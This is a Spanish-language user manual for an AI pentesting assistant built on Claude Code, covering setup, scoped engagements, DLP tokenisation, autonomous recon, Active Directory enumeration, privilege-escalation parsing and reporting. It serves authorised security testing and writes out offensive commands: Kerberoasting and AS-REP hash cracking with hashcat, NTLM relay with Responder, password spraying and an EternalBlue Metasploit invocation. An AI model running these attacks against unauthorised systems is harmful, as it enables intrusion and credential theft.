# OffSec Assistant — Manual de usuario

> Guia completa de instalacion, configuracion y uso del asistente.
> Para la descripcion general del proyecto ver [README.md](README.md).

---

## Indice

1. [Modos de ejecucion](#1-modos-de-ejecucion)
2. [Instalacion y configuracion](#2-instalacion-y-configuracion)
   - [Modo nativo](#21-modo-nativo)
   - [Modo Docker lite](#22-modo-docker-lite-recomendado)
   - [Modo Docker full con Metasploit](#23-modo-docker-full-con-metasploit)
   - [Modo Docker con VPN](#24-modo-docker-con-vpn)
3. [Primer uso](#3-primer-uso)
4. [Flujo de engagement completo](#4-flujo-de-engagement-completo)
   - [Inicio de sesion](#41-inicio-de-sesion)
   - [Crear un engagement](#42-crear-un-engagement)
   - [Definir el scope](#43-definir-el-scope)
   - [Inicializar el mapa DLP](#44-inicializar-el-mapa-dlp)
   - [Reconocimiento](#45-reconocimiento)
   - [Analisis de vulnerabilidades](#46-analisis-de-vulnerabilidades)
   - [Active Directory enumeration](#47-active-directory-enumeration)
   - [Post-explotacion: linPEAS y winPEAS](#48-post-explotacion-linpeas-y-winpeas)
   - [Web testing con Burp Suite](#49-web-testing-con-burp-suite)
   - [Explotacion](#410-explotacion)
   - [Cierre de sesion](#411-cierre-de-sesion)
   - [Generar reporte](#412-generar-reporte)
5. [Control DLP — uso avanzado](#5-control-dlp--uso-avanzado)
6. [Live feed — seguir ejecucion autonoma](#6-live-feed--seguir-ejecucion-autonoma)
7. [Modulo MITRE ATT&CK](#7-modulo-mitre-attck)
8. [Modo conversacional](#8-modo-conversacional)
9. [Referencia de comandos](#9-referencia-de-comandos)
10. [Tips y buenas practicas](#10-tips-y-buenas-practicas)
11. [Troubleshooting](#11-troubleshooting)

---

## 1. Modos de ejecucion

OffSec Assistant puede ejecutarse de dos formas:

| Modo | Cuando usarlo | Requisitos en el host |
|------|--------------|----------------------|
| **Nativo** | Maquina propia con herramientas ya instaladas | Claude Code + herramientas de pentesting |
| **Docker** | Cualquier maquina con Docker; entorno limpio y reproducible | Docker + Docker Compose + API key |

El modo Docker es el recomendado para engagements profesionales: garantiza las mismas
versiones de herramientas, aísla el entorno del host y soporta VPN de forma nativa.

---

## 2. Instalacion y configuracion

### 2.1 Modo nativo

```bash
# 1. Clonar el repositorio
git clone https://github.com/Joscalion04/OffSec-Assistant.git
cd OffSec-Assistant

# 2. Instalar herramientas de pentesting (Arch/Manjaro)
sudo pacman -S nmap masscan nikto sqlmap whatweb gobuster netcat socat \
               git python curl wget jq whois bind
yay -S amass subfinder theHarvester nuclei ffuf

# 3. Verificar herramientas instaladas
#    (hacer esto dentro de Claude Code)
/check-tools

# 4. Abrir el asistente
claude
```

Claude Code autentica con tu cuenta de Anthropic. Si es la primera vez:
```bash
claude auth login
```

### 2.2 Modo Docker lite (recomendado)

El target `lite` incluye todo el stack excepto Metasploit. Imagen final ~2-3 GB.

```bash
# 1. Clonar el repositorio
git clone https://github.com/Joscalion04/OffSec-Assistant.git
cd OffSec-Assistant

# 2. Configurar variables de entorno
cp .env.example .env
# Editar .env y completar:
#   ANTHROPIC_API_KEY=sk-ant-api03-TU_KEY_AQUI

# 3. Construir la imagen (una sola vez, o cuando cambies el Dockerfile)
docker compose build

# 4. Iniciar el asistente
docker compose run --rm assistant
```

El primer build descarga la imagen base de Kali y compila el stack completo.
Puede tomar 15-30 minutos segun la velocidad de conexion. Los builds siguientes
son rapidos gracias al cache de capas de Docker.

### 2.3 Modo Docker full (con Metasploit)

Agrega Metasploit Framework. Imagen final ~5 GB.

```bash
# Construir (primera vez o para actualizar)
docker compose -f docker-compose.yml -f docker-compose.full.yml build

# Ejecutar
docker compose -f docker-compose.yml -f docker-compose.full.yml run --rm assistant
```

Para no escribir el comando completo cada vez, se puede crear un alias:
```bash
alias offsec-full='docker compose -f docker-compose.yml -f docker-compose.full.yml run --rm assistant'
```

### 2.4 Modo Docker con VPN

El contenedor soporta OpenVPN y WireGuard. La VPN es opcional y se activa por
variable de entorno. Los archivos de configuracion se montan en `/vpn/` y jamas
se incluyen en la imagen ni en el repositorio.

#### OpenVPN

```bash
# Copiar el archivo de configuracion al directorio vpn/
cp /ruta/a/mi_engagement.ovpn docker/vpn/config.ovpn

# Iniciar con VPN activa
USE_VPN=true docker compose run --rm assistant
```

Si tu archivo `.ovpn` requiere credenciales interactivas, agregalas en un archivo
auxiliar y referencialas con `auth-user-pass` en el `.ovpn`.

#### WireGuard

```bash
cp /ruta/a/wg0.conf docker/vpn/wg0.conf
USE_VPN=true docker compose run --rm assistant
```

WireGuard requiere que el kernel del host tenga soporte (kernel >= 5.6 o modulo
`wireguard` cargado). Verificar en el host:
```bash
lsmod | grep wireguard
# o
modinfo wireguard
```

#### Verificar que la VPN esta activa (dentro del contenedor)

```bash
ip addr show tun0        # OpenVPN
ip addr show wg0         # WireGuard
curl -s https://ifconfig.me   # Ver IP publica de salida
```

#### Directorio vpn/ y seguridad

```
docker/vpn/
|-- .gitignore    <- ignora todo excepto .gitignore y .gitkeep
`-- .gitkeep      <- mantiene el directorio en git

# Los archivos .ovpn y .conf son ignorados por git automaticamente
# Verificar que no se van a commitear:
git status docker/vpn/
```

#### Persistencia de datos en Docker

Todos los datos del engagement persisten en el host via bind mounts:

```
Host                          Contenedor
----                          ----------
./findings/          <-->     /workspace/findings/
./reports/           <-->     /workspace/reports/
./logs/              <-->     /workspace/logs/
./templates/         <-->     /workspace/templates/   (read-only)
./tools/             <-->     /workspace/tools/        (read-only)
./docker/vpn/        <-->     /vpn/                    (read-only)

Volumen nombrado:
offsec-claude-config          /root/.claude   (config de Claude Code)
```

Los datos no se pierden al detener el contenedor. Para limpiar completamente:
```bash
docker compose down -v   # elimina tambien el volumen de Claude Code config
```

---

## 3. Primer uso

Al abrir el asistente por primera vez (modo nativo o Docker):

```
# Verificar herramientas disponibles
/check-tools

# El asistente mostrara una tabla como:
# Herramienta | Estado    | Instalacion
# nmap        | instalado | --
# masscan     | instalado | --
# nuclei      | FALTA     | yay -S nuclei
# ...
```

Si hay herramientas faltantes:
- **Modo nativo**: instalarlas en el host segun los comandos que muestra `/check-tools`
- **Modo Docker**: ya deberian estar todas incluidas en la imagen. Si falta alguna,
  reconstruir con `docker compose build --no-cache`

---

## 4. Flujo de engagement completo

### 4.1 Inicio de sesion

El primer comando de cada dia de trabajo:

```
/morning-brief
```

El asistente lee todos los engagements activos en `findings/` y genera un briefing:
- Cliente y deadline de cada engagement
- Fase actual y progreso
- Pendientes de la sesion anterior
- Alerta si algun deadline esta en menos de 3 dias
- Recomendacion de foco para hoy

Si no hay engagements activos, sugiere crear uno con `/new-engagement`.

### 4.2 Crear un engagement

```
/new-engagement acme-corp-2026
```

El asistente:
1. Crea `findings/2026-06-08_acme-corp-2026/` con toda la estructura
2. Copia las plantillas de scope, context y finding
3. Inicializa un repositorio git dentro del engagement
4. Muestra los proximos pasos

Convencion de nombres: usar guiones, sin espacios, sin acentos.
Ejemplos: `acme-corp-webapp`, `lab-htb-active`, `bugbounty-ejemplo-com`

### 4.3 Definir el scope

**Este paso es obligatorio antes de cualquier accion activa.**

El asistente no ejecutara herramientas contra un target que no este en `scope.md`.

```bash
# Editar el scope del engagement recien creado
# (el asistente muestra la ruta exacta despues de /new-engagement)
# Ejemplo: findings/2026-06-08_acme-corp-2026/scope.md
```

Campos clave a completar en `scope.md`:

```markdown
## Informacion del cliente
- Cliente: Acme Corporation
- Contacto tecnico: Juan Perez — juan@acme.com

## Targets autorizados
| IP / Dominio        | Descripcion      | Notas              |
|---------------------|------------------|--------------------|
| 192.168.10.0/24     | Red interna      | Excluir .1 (GW)    |
| webapp.acme.com     | App web principal| Solo HTTP/HTTPS     |
| 192.168.10.50       | Servidor Windows | Authorized for MSF |
```

### 4.4 Inicializar el mapa DLP

Una vez completado el scope, inicializar el sistema de proteccion de datos:

```bash
# Desde el directorio del proyecto
python3 tools/sanitizer.py findings/2026-06-08_acme-corp-2026 --init
```

Salida esperada:
```
[DLP] Mapa inicializado: 3 IPs, 1 hosts, 1 orgs
```

Esto registra en `findings/<engagement>/dlp-map.json` todos los IPs, hostnames
y nombre del cliente del scope.md. A partir de este momento, el agente recibe
`TGT-001` en lugar de `192.168.10.50` en todos los mensajes de herramientas.

El mapa DLP es local y nunca sale del entorno (gitignored, no se monta en la imagen).

### 4.5 Reconocimiento

#### Modo interactivo (recomendado para empezar)

El agente pregunta antes de cada fase y muestra resultados parciales:

```
/recon 192.168.10.50
```

Flujo tipico:
1. El asistente ejecuta WHOIS y DNS
2. Muestra resultados, pregunta si continuar con puertos
3. Ejecuta nmap top-1000
4. Muestra puertos abiertos, decide si ejecutar deteccion de servicios
5. Si hay web, ejecuta WhatWeb
6. Presenta resumen y sugiere `/vuln-scan`

#### Modo autonomo

Para dejar que el agente ejecute toda la fase sin interrupciones:

```
/recon 192.168.10.50 -auto
```

El agente:
1. Verifica que el target esta en `scope.md`
2. Informa la ruta del live feed
3. Ejecuta todas las fases en orden (pasivo → activo)
4. Toma decisiones basadas en resultados intermedios
5. Actualiza `context.md` al finalizar
6. Presenta resumen

Para seguir el progreso en tiempo real abrir otra terminal:
```bash
tail -f logs/livefeed/2026-06-08_acme-corp-2026_recon.log
```

Ver seccion [6. Live feed](#6-live-feed--seguir-ejecucion-autonoma) para detalles.

#### Archivos generados por recon

```
findings/2026-06-08_acme-corp-2026/recon/
|-- whois.txt          <- datos WHOIS completos (raw)
|-- dns.txt            <- registros A, MX, NS
|-- subdomains.txt     <- subdominios encontrados
|-- nmap_ports.txt     <- escaneo top-1000 puertos
|-- nmap_services.txt  <- deteccion de servicios y versiones
`-- whatweb.txt        <- tecnologias web detectadas
```

Estos archivos contienen datos raw del target. Para que el agente los analice
sin violar el control DLP, pasarlos por el sanitizador:

```bash
# Leer nmap sanitizado
python3 tools/sanitizer.py findings/2026-06-08_acme-corp-2026 \
    findings/2026-06-08_acme-corp-2026/recon/nmap_services.txt
```

### 4.6 Analisis de vulnerabilidades

```
/vuln-scan 192.168.10.50
/vuln-scan 192.168.10.50 -auto   # modo autonomo
```

Prerequisito recomendado: tener recon previo. Si no existe, el agente pregunta
si ejecutar `/recon` primero.

Herramientas que ejecuta:
- `nmap --script vuln` en puertos abiertos
- `searchsploit` correlacionando servicios y versiones encontrados
- `nikto` si hay web
- `nuclei -severity critical,high` si hay web

Hallazgos son pre-documentados automaticamente por el agente `doc-writer` en
`findings/<engagement>/vulns/FIND-NNN_<titulo>.md` con formato CVSS 3.1.

### 4.7 Active Directory enumeration

Modulo especifico para entornos Windows/AD. Ejecutar despues de `/vuln-scan` cuando
se detectan puertos AD abiertos (88 Kerberos, 389 LDAP, 445 SMB, 636 LDAPS).

#### Sin credenciales (null session / anonimo)

```
/ad-enum <ip_dc> <nombre_engagement> --anon
```

El agente verifica que el DC esta en `scope.md` y ejecuta:
1. Fingerprint de puertos AD con nmap
2. Enumeracion SMB/NetBIOS via enum4linux-ng (null session)
3. Fingerprint con CrackMapExec / NetExec (deteccion de SMB signing)

#### Con credenciales de dominio comprometidas

```
/ad-enum <ip_dc> <engagement> --user jdoe --pass Password123 --domain corp.local
```

Activa adicionalmente:
- LDAP dump completo del dominio (ldapdomaindump): usuarios, grupos, computadoras, GPOs
- Kerberoasting con `--kerberoast`: captura hashes TGS de cuentas con SPN
- AS-REP Roasting con `--asreproast`: cuentas sin pre-autenticacion Kerberos
- BloodHound collection con `--bloodhound`: genera ZIP para importar en la GUI

#### Ejemplo de flujo completo AD

```
# Primera enumeracion (sin creds)
/ad-enum 10.10.10.100 acme-corp-2026 --anon

# Si SMB signing esta OFF y se obtienen creds por spray o fuerza bruta
/ad-enum 10.10.10.100 acme-corp-2026 \
    --user jdoe --pass Password123 --domain corp.local \
    --bloodhound --kerberoast --asreproast

# Si hay hashes Kerberos capturados, crackear offline:
# hashcat -m 13100 findings/<eng>/recon/ad/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
# hashcat -m 18200 findings/<eng>/recon/ad/asreproast_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Archivos generados

```
findings/<engagement>/recon/ad/
|-- ports_ad.txt           <- puertos AD detectados por nmap
|-- smb_enum.txt           <- output de enum4linux-ng (sanitizado en logs)
|-- cme_smb.txt            <- fingerprint CME/NetExec con signing status
|-- ldap/                  <- dump completo (ldapdomaindump)
|   |-- domain_users.json
|   |-- domain_computers.json
|   |-- domain_groups.json
|   `-- domain_policy.json
|-- bloodhound/            <- ZIP para BloodHound GUI
|   `-- <timestamp>_BloodHound.zip
|-- kerberoast_hashes.txt  <- hashes TGS para crackeo offline
`-- asreproast_hashes.txt  <- hashes AS-REP para crackeo offline
```

**Nota DLP**: todos los outputs son sanitizados antes de llegar al agente.
Hostnames, IPs y nombres de usuarios del dominio se tokenizan automaticamente.

#### Interpretar resultados criticos

| Hallazgo | Tecnica ATT&CK | Siguiente paso |
|----------|---------------|----------------|
| SMB Signing disabled | T1557.001 | ntlmrelayx.py + Responder |
| Cuentas Kerberoastable | T1558.003 | hashcat -m 13100 |
| Cuentas AS-REP Roastable | T1558.004 | hashcat -m 18200 |
| BloodHound ZIP generado | T1069.002 | Importar en GUI, query "Shortest Path to DA" |
| Creds en LDAP / politicas | T1078.002 | Lateral movement / acceso directo |

### 4.8 Post-explotacion: linPEAS y winPEAS

Una vez con shell en el host comprometido, ejecutar linPEAS (Linux) o winPEAS (Windows)
y transferir el output al directorio del engagement para analisis automatico.

#### Ejecutar linPEAS en el host comprometido

```bash
# En el host comprometido (transferir el binario primero)
./linpeas.sh > /tmp/linpeas_output.txt 2>&1

# Transferir al entorno de trabajo (ejemplo via scp)
scp usuario@host-comprometido:/tmp/linpeas_output.txt \
    findings/2026-06-08_acme-corp-2026/post-exploitation/
```

#### Parsear el output automaticamente

```
/parse-privesc acme-corp-2026 findings/2026-06-08_acme-corp-2026/post-exploitation/linpeas_output.txt
```

El asistente:
1. Detecta automaticamente si es linPEAS o winPEAS por el contenido
2. Extrae y categoriza los vectores de escalacion de privilegios
3. Genera `findings/<engagement>/post-exploitation/finding_privesc.md`
4. Muestra severidad estimada y resumen de vectores

#### Categorias que detecta el parser

**linPEAS (Linux):**
- Binarios SUID — referencia automatica a GTFOBins
- Sudo misconfigurations (NOPASSWD, permisos excesivos)
- Cron jobs con scripts escribibles
- Credenciales en variables de entorno, archivos de config
- Version del kernel — sugiere `searchsploit linux kernel <version>`
- Archivos interesantes (id_rsa, .pem, .bak, config files)

**winPEAS (Windows):**
- AlwaysInstallElevated habilitado (vector de escalacion via MSI)
- Credenciales de AutoLogon en el registro
- Servicios con rutas sin comillas (Unquoted Service Path)
- Servicios / binarios modificables por el usuario actual
- Credenciales encontradas en archivos de configuracion

#### Ejemplo de salida del parser

```
[PRIVESC] Analisis de linPEAS
  Severidad estimada:  High
  SUID binaries:       14
  Sudo misconfig:      1
  Cron jobs:           2
  Credenciales:        3
  Kernel:              5.4.0-42-generic

  Ejecutar con --finding para generar finding_privesc.md
```

Despues de generar el finding, el agente agrega el mapping MITRE ATT&CK correspondiente
y sugiere el siguiente paso de explotacion.

### 4.9 Web testing con Burp Suite

Integracion con la REST API de Burp Suite Professional. Requiere Burp Suite Pro
corriendo localmente con la REST API habilitada (puerto 1337 por defecto).

#### Configurar la API de Burp

1. En Burp Suite Pro: `User options > Suite > REST API`
2. Habilitar la API y copiar el API Key generado
3. Setear la variable de entorno:
   ```bash
   export BURP_API_KEY="tu_api_key_aqui"
   # O agregar a .env si usas Docker
   ```

#### Flujo tipico

```
# 1. Verificar conectividad
/burp-scan status

# 2. Iniciar scan (URL debe estar en scope.md)
/burp-scan scan https://webapp.acme.com

# Output: "Scan iniciado — Scan ID: 42"

# 3. Monitorear progreso
/burp-scan results 42

# 4. Listar todos los scans
/burp-scan list

# 5. Exportar hallazgos al engagement
/burp-scan findings 42 acme-corp-2026
```

#### Findings exportados

Los hallazgos se guardan como `findings/<engagement>/vulns/finding_burp_NNN.md`
con el formato estandar del proyecto:
- Severidad Burp mapeada a Critical/High/Medium/Low
- CVSS 3.1 estimado (ajustar manualmente con vector completo)
- Tecnica MITRE ATT&CK mapeada automaticamente
- Confianza del hallazgo (firm/tentative/certain)
- Instancias afectadas (rutas del target, sanitizadas via DLP)

#### Si Burp no esta disponible

El asistente sugiere alternativas automaticamente:
```
[INFO] Burp Suite no detectado. Alternativas disponibles:
  - /vuln-scan <target> -auto  (incluye Nikto + Nuclei + nmap NSE)
  - nuclei -t web -severity critical,high -u <target>
  - nikto -h <target>
```

### 4.10 Explotacion

```
/exploit 192.168.10.50
/exploit 192.168.10.50 -auto   # analisis autonomo; la ejecucion SIEMPRE pide confirmacion
```

El flag `-auto` solo automatiza el analisis y preparacion del exploit, nunca su ejecucion.
El agente siempre presenta el comando exacto y espera confirmacion explicita:

```
[CONFIRMACION REQUERIDA]
Vector seleccionado: EternalBlue — MS17-010
Comando a ejecutar: msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; ..."
Impacto potencial: RCE como SYSTEM
Responde "si, ejecutar" para confirmar
```

Si el operador escribe cualquier otra cosa, la ejecucion se cancela.

### 4.11 Cierre de sesion

```
/session-close acme-corp-2026
```

El asistente:
1. Lee `context.md` y los logs del dia
2. Genera resumen de sesion (duracion, comandos, hallazgos)
3. Lista pendientes para la proxima sesion
4. Actualiza `context.md`
5. Hace commit en el git del engagement: `session: 2026-06-08 — X hallazgos documentados`

Si hay multiples engagements activos y no se especifica nombre, el asistente pregunta.

### 4.12 Generar reporte

```
/report acme-corp-2026
```

Lee todos los archivos del engagement y genera `reports/acme-corp-2026_report_2026-06-08.md`:

**Secciones del reporte:**
1. Executive Summary — lenguaje no tecnico para gerencia, con distribucion de hallazgos por severidad
2. Scope y metodologia (targets, tipo de prueba, herramientas)
3. Hallazgos por severidad (Critical → Informational)
   - CVSS 3.1 score y vector string
   - Tecnica MITRE ATT&CK mapeada
   - Evidencia (referencia a archivos, no contenido raw)
   - Impacto de negocio
   - Remediacion especifica con version/configuracion concreta
   - Referencias a CVE, CWE y documentacion oficial
4. Conclusiones y recomendaciones generales
5. Roadmap de remediacion: inmediato / 30 dias / 90 dias

**CVSS y MITRE en el reporte**: el agente calcula el CVSS 3.1 de cada finding basado
en la descripcion y evidencia disponible, y mapea cada hallazgo a la tecnica ATT&CK
correspondiente usando `tools/map-mitre.py`. Si algun score o tecnica no es preciso,
el operador puede ajustarlo manualmente en el archivo generado.

**Nota DLP sobre reportes**: el reporte usa tokens (TGT-001, HST-001). Antes de
entregar al cliente, el operador reemplaza los tokens con los valores reales usando
el `dlp-map.json` como referencia. El agente muestra un recordatorio de este paso
al terminar de generar el reporte. Esto es intencional: mantiene el dato sensible
fuera del ciclo del agente hasta el momento de entrega.

---

## 5. Control DLP — uso avanzado

El sistema DLP tokeniza datos sensibles del target antes de que lleguen al agente
(y por ende a la API de Anthropic). Ver [README.md](README.md#caracteristicas) para
descripcion de la arquitectura.

### Consultar el mapa actual

```bash
cat findings/2026-06-08_acme-corp-2026/dlp-map.json
```

Salida ejemplo:
```json
{
  "version": 2,
  "targets": {
    "192.168.10.50": "TGT-001",
    "192.168.10.51": "TGT-002"
  },
  "hosts": {
    "webapp.acme.com": "HST-001"
  },
  "orgs": {
    "acme corporation": "ORG-001"
  },
  "emails": {
    "juan@acme.com": "MAIL-001"
  }
}
```

### Obtener el token de un valor especifico

```bash
echo "192.168.10.50" | python3 tools/sanitizer.py findings/2026-06-08_acme-corp-2026
# Output: TGT-001
```

### Registrar un hostname descubierto manualmente

```bash
# Si encontras un hostname durante una fase manual que no esta en scope.md
python3 tools/sanitizer.py findings/2026-06-08_acme-corp-2026 \
    --register-host internal.acme.com
# Output: HST-002
```

### Registrar una organizacion descubierta en WHOIS

```bash
python3 tools/sanitizer.py findings/2026-06-08_acme-corp-2026 \
    --register-org "Acme Holdings Ltd"
# Output: ORG-002
```

### Sanitizar un archivo de output manual

Si ejecutas una herramienta fuera del modo -auto, sanitizar el output antes
de pasarselo al agente:

```bash
# Ejecutar herramienta
nmap -sV -p 80,443,8080 192.168.10.50 > /tmp/scan.txt

# Sanitizar y mostrar (lo que el agente deberia ver)
python3 tools/sanitizer.py findings/2026-06-08_acme-corp-2026 /tmp/scan.txt

# Output sanitizado:
# PORT     STATE  SERVICE  VERSION
# 80/tcp   open   http     Apache httpd 2.4.49
# 443/tcp  open   https    Apache httpd 2.4.49
# Host: TGT-001 (TGT-001)
```

### Recuperar valores reales desde tokens (para entregar el reporte)

El operador hace la substitucion final de tokens en el reporte antes de entregarlo:

```bash
# Script simple de substitucion usando el mapa DLP
python3 - << 'EOF'
import json, re, sys

map_file = "findings/2026-06-08_acme-corp-2026/dlp-map.json"
report_file = "reports/acme-corp-2026_report_2026-06-08.md"

with open(map_file) as f:
    dlp = json.load(f)

with open(report_file) as f:
    content = f.read()

# Invertir el mapa: token -> valor_real
reverse = {}
for category in ("targets", "hosts", "orgs", "emails"):
    for real, token in dlp[category].items():
        reverse[token] = real

# Reemplazar tokens con valores reales
for token, real in sorted(reverse.items(), key=lambda x: len(x[0]), reverse=True):
    content = content.replace(token, real)

print(content)
EOF
```

---

## 6. Live feed — seguir ejecucion autonoma

Cuando se usa `-auto`, el agente escribe progreso en tiempo real a dos lugares:
1. La terminal donde esta corriendo (para el operador presente)
2. Un archivo de log en `logs/livefeed/` (para seguir desde otra terminal)

### Ver el livefeed en otra terminal

```bash
# Ver el log mas reciente
tail -f logs/livefeed/$(ls -t logs/livefeed/ | head -1)

# O con ruta explicita (el asistente siempre informa la ruta al iniciar -auto)
tail -f logs/livefeed/2026-06-08_acme-corp-2026_recon.log
```

### Leyenda de prefijos del livefeed

```
[PHASE]   inicio de una fase nueva
[PLAN]    plan de ejecucion antes de empezar
[START]   comando iniciado
[DONE]    comando completado sin errores
[FIND]    hallazgo menor o advertencia
[CRIT]    hallazgo critico — revisar inmediatamente
[THINK]   decision tomada por el agente con justificacion
[SKIP]    herramienta no disponible, paso omitido
[CONF]    requiere confirmacion del operador (solo en /exploit)
[SUM]     resumen final de la fase
```

### Ejemplo de livefeed tipico

```
[09:14:22] [PHASE] ==========================================
[09:14:22] [PHASE]  RECON AUTONOMO — Target: TGT-001
[09:14:22] [PLAN]  Plan de ejecucion (pasivo a activo):
[09:14:22] [PLAN]    1. WHOIS y DNS pasivo
[09:14:23] [START] WHOIS TGT-001
[09:14:25] [DONE]  WHOIS TGT-001 completado
[09:14:25] [THINK] Organizacion detectada: ORG-001
[09:14:26] [START] DNS registros A/MX/NS para TGT-001
[09:14:27] [THINK] TGT-001 resuelve a TGT-002 — usando para escaneos activos
[09:14:28] [START] Nmap top-1000 puertos en TGT-002
[09:17:03] [THINK] 5 puertos abiertos: 22,80,443,445,3389
[09:17:03] [THINK] HTTP/HTTPS detectado — ejecutando analisis web
[09:17:03] [THINK] SMB detectado — vector de alto interes
```

Notese que los datos sensibles aparecen como tokens (`TGT-001`, `ORG-001`).
Los datos reales estan en el `dlp-map.json` del engagement.

### Interrumpir una ejecucion autonoma

Para detener un `-auto` en progreso: `Ctrl+C` en la terminal del asistente.
El progreso hasta ese punto queda guardado en los archivos de findings y en el livefeed.

---

## 7. Modulo MITRE ATT&CK

El proyecto incluye un mapeador de tecnicas MITRE ATT&CK integrado en todos los modulos.
El archivo `tools/map-mitre.py` cubre 60+ tecnicas en 10 tacticas.

### Uso desde la linea de comandos

```bash
# Buscar por keyword
python3 tools/map-mitre.py "sql injection"
python3 tools/map-mitre.py "kerberoasting"
python3 tools/map-mitre.py "privilege escalation"
python3 tools/map-mitre.py "suid"

# Analizar un finding existente (detecta tecnicas en el contenido)
python3 tools/map-mitre.py --finding findings/2026-06-08_acme/vulns/finding_001.md

# Ver todas las tacticas cubiertas
python3 tools/map-mitre.py --list-tactics

# Output en JSON (para integraciones)
python3 tools/map-mitre.py --json "lateral movement"
```

### Ejemplo de output

```
[MITRE ATT&CK] Tecnicas mapeadas (query: kerberoasting):

  [1] T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
       Tactica: Credential Access
       Ref:     https://attack.mitre.org/techniques/T1558/003/
```

### Tacticas cubiertas

| Tactica | Tecnicas incluidas (ejemplos) |
|---------|-------------------------------|
| Reconnaissance | Port scan, Subdomain enum, OSINT |
| Initial Access | SQLi, RCE, LFI, SSRF, XXE, File Upload, Default Credentials |
| Execution | PowerShell, Bash, WebShell, JavaScript (XSS) |
| Persistence | Web Shell |
| Privilege Escalation | SUID, Sudo, Cron, DLL Hijacking, Token Impersonation, LPE |
| Credential Access | Brute Force, Kerberoasting, AS-REP Roasting, NTLM, Pass-the-Hash, LSASS |
| Defense Evasion | Misconfiguration |
| Discovery | Port/Service enum, SMB enum, LDAP/AD enum, BloodHound |
| Lateral Movement | SMB, WinRM, Pass-the-Hash |
| Exfiltration | C2 Channel |
| Impact | Ransomware, DoS |

### Integracion automatica

El mapper se llama automaticamente en:
- `/ad-enum` — mapea tecnicas AD (Kerberoasting, BloodHound, etc.)
- `/parse-privesc` — mapea tecnicas de privesc por categoria (SUID, sudo, cron, etc.)
- `/burp-scan findings` — mapea cada issue de Burp a su tecnica correspondiente
- `/report` — incluye la tecnica en cada hallazgo del reporte final

### Cuando un hallazgo no tiene mapeo automatico

Si el mapper no encuentra coincidencia, el agente indica `T1190 — Exploit Public-Facing
Application` como fallback generico para hallazgos web, y pide al operador que revise
el mapping antes de incluirlo en el reporte final.

---

## 8. Modo conversacional

No todos los problemas requieren un comando. El asistente entiende lenguaje natural
y activa el agente `decision-advisor` cuando detecta que el operador necesita razonar,
no ejecutar.

### Cuando usar el modo conversacional

```
# Estas frases activan razonamiento guiado automaticamente:
"estoy trabado en X"
"que harias con Y"
"por donde sigo"
"no entiendo por que Z no funciona"
"tengo acceso a la maquina pero soy usuario de bajos privilegios"
```

### Comando /think para razonamiento explicito

```
/think encontre SMB abierto en un Windows Server 2019 pero EternalBlue no aplica
       porque esta parcheado. Tengo credenciales de un usuario de dominio.
```

El agente `decision-advisor` responde con:
1. Hechos confirmados del contexto
2. Suposiciones explicitas
3. Gaps de informacion
4. Perspectiva del atacante real
5. Vectores ordenados por probabilidad x impacto
6. Una sola recomendacion concreta

### Comando /explain para contexto tecnico

```
/explain CVE-2021-41773
/explain pass-the-hash
/explain Kerberoasting
/explain privilege escalation linux desde usuario www-data
```

El agente adapta la explicacion al contexto del engagement activo si existe.
Para CVEs incluye CVSS score, versiones afectadas y si hay exploit publico disponible.

---

## 9. Referencia de comandos

### Gestion de engagements

| Comando | Descripcion | Ejemplo |
|---------|-------------|---------|
| `/new-engagement <nombre>` | Crea estructura completa + git | `/new-engagement banco-xyz` |
| `/morning-brief` | Briefing diario de todos los engagements | `/morning-brief` |
| `/status [nombre]` | Estado actual del engagement | `/status banco` |
| `/session-close [nombre]` | Cierra sesion y hace commit | `/session-close banco-xyz` |

### Pentesting — fases

| Comando | Descripcion | Ejemplo |
|---------|-------------|---------|
| `/recon <target> [-auto]` | Reconocimiento completo | `/recon 10.10.10.5 -auto` |
| `/vuln-scan <target> [-auto]` | Analisis de vulnerabilidades | `/vuln-scan webapp.com` |
| `/exploit <target> [-auto]` | Vectores y explotacion | `/exploit 10.10.10.5` |
| `/report <engagement>` | Reporte ejecutivo + tecnico con CVSS y MITRE | `/report banco-xyz` |

### Active Directory

| Comando | Descripcion | Ejemplo |
|---------|-------------|---------|
| `/ad-enum <dc> <eng>` | Enumeracion AD completa | `/ad-enum 10.10.10.100 acme` |
| `/ad-enum ... --anon` | Sin credenciales (null session) | `/ad-enum 10.0.0.1 lab --anon` |
| `/ad-enum ... --bloodhound` | Incluye BloodHound collection | `... --bloodhound` |
| `/ad-enum ... --kerberoast` | Kerberoasting (requiere creds) | `... --kerberoast` |
| `/ad-enum ... --asreproast` | AS-REP Roasting | `... --asreproast` |

Flags completos de `/ad-enum`: `--user <u>`, `--pass <p>`, `--hash <nt>`, `--domain <d>`, `--dc-ip <ip>`

### Post-explotacion

| Comando | Descripcion | Ejemplo |
|---------|-------------|---------|
| `/parse-privesc <eng> <file>` | Parsea linPEAS/winPEAS y genera finding | `/parse-privesc acme linpeas.txt` |

### Burp Suite

| Comando | Descripcion | Ejemplo |
|---------|-------------|---------|
| `/burp-scan status` | Verifica conectividad con Burp | `/burp-scan status` |
| `/burp-scan scan <url>` | Inicia scan activo | `/burp-scan scan https://app.com` |
| `/burp-scan list` | Lista todos los scans | `/burp-scan list` |
| `/burp-scan results <id>` | Estado y estadisticas del scan | `/burp-scan results 42` |
| `/burp-scan findings <id> <eng>` | Exporta hallazgos al engagement | `/burp-scan findings 42 acme` |

Variables de entorno para Burp: `BURP_HOST` (default: 127.0.0.1), `BURP_PORT` (default: 1337), `BURP_API_KEY` (requerida)

### Asistencia inteligente

| Comando | Descripcion | Ejemplo |
|---------|-------------|---------|
| `/think <situacion>` | Razonamiento guiado | `/think tengo shell como www-data` |
| `/explain <tema>` | Explicacion tecnica contextualizada | `/explain SSRF` |
| `/livefeed` | Ruta del live feed activo | `/livefeed` |

### Utilidades

| Comando | Descripcion |
|---------|-------------|
| `/check-tools` | Verifica herramientas instaladas (incluye AD tools y scripts del proyecto) |
| `/help` | Menu general de comandos |

---

## 10. Tips y buenas practicas

### Flujo diario optimo

```
Inicio del dia:
  /morning-brief             <- ver estado de todos los engagements

Trabajo (orden recomendado por fase):
  /recon <target> -auto      <- en segundo plano si es largo
  /vuln-scan <target>        <- modo interactivo para revisar cada hallazgo
  /ad-enum <dc> <eng>        <- si hay entorno Windows/AD en scope
  /burp-scan scan <url>      <- si hay aplicacion web y Burp disponible
  /parse-privesc <eng> <f>   <- despues de obtener shell y correr linPEAS/winPEAS
  /think <duda especifica>   <- en cualquier momento, cuando estes trabado

Fin del dia:
